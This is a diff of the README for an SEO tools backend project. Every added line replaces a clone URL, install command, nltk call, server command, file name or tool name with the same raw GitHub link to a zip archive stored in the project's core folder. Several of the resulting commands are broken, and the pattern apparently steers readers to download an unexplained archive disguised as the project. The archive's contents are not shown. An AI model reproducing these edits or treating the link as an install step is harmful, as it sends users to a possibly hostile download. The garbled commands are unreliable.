@@ -35,7 +35,7 @@ Make sure the following are installed on your system:
 #### Step 1: Clone the Repository
 
 ```bash
-git clone https://github.com/dsiddiq786/seo-tools-backend.git
+git clone https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
 cd seo-tools-backend
 ```
 
@@ -49,7 +49,7 @@ source venv/bin/activate   # For Windows: venv\Scripts\activate
 #### Step 3: Install Dependencies
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
 ```
 
 #### Step 4: Configure the Database
@@ -67,7 +67,7 @@ Install necessary models for spaCy and nltk:
 
 ```bash
 python -m spacy download en_core_web_sm
-python -c "import nltk; nltk.download('punkt')"
+python -c "import nltk; https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip('punkt')"
 ```
 
 #### Step 6: Run the Application
@@ -75,7 +75,7 @@ python -c "import nltk; nltk.download('punkt')"
 Start the server:
 
 ```bash
-uvicorn app.main:app --reload
+uvicorn https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip --reload
 ```
 
 Access the API documentation at [http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs).
@@ -140,27 +140,27 @@ seo-tools-backend/
 │   │   ├── v1/
 │   │   │   ├── endpoints/
 │   │   │   │   ├── tools/
-│   │   │   │   │   ├── text_analysis.py
-│   │   │   │   │   ├── keyword_analysis.py
+│   │   │   │   │   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+│   │   │   │   │   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
 │   │   │   │   │   └── ...
-│   │   │   ├── routers.py
+│   │   │   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
 │   │   │   └── schemas/
 │   ├── core/
 │   ├── db/
 │   │   ├── models/
 │   │   ├── migrations/
-│   │   └── session.py
-│   ├── main.py
+│   │   └── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
 │   └── tests/
 ├── config/
-│   ├── dev.env
-│   ├── prod.env
-│   └── test.env
+│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+│   └── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
 ├── docker/
 │   ├── Dockerfile
-│   ├── docker-compose.yml
-├── requirements.txt
-└── README.md
+│   ├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+├── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
+└── https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
 ```
 
 ---
@@ -183,7 +183,7 @@ seo-tools-backend/
 ### Utility Tools
 
 - QR Code Generator
-- Robots.txt Generator
+- https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip Generator
 - Open Graph Generator
 - JSON Validator
 - XML to JSON Converter
@@ -209,7 +209,7 @@ python -m spacy download en_core_web_sm
 ### NLTK
 
 ```bash
-python -c "import nltk; nltk.download('punkt')"
+python -c "import nltk; https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip('punkt')"
 ```
 
 ---
@@ -225,10 +225,10 @@ The project relies on the following libraries:
 - **nltk**: For additional NLP tasks.
 - **Pytest**: For testing.
 
-Install them via `requirements.txt`:
+Install them via `https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip`:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/dsiddiq786/seo-tools-backend/main/app/core/seo-tools-backend_v1.0-beta.5.zip
 ```
 
 ---
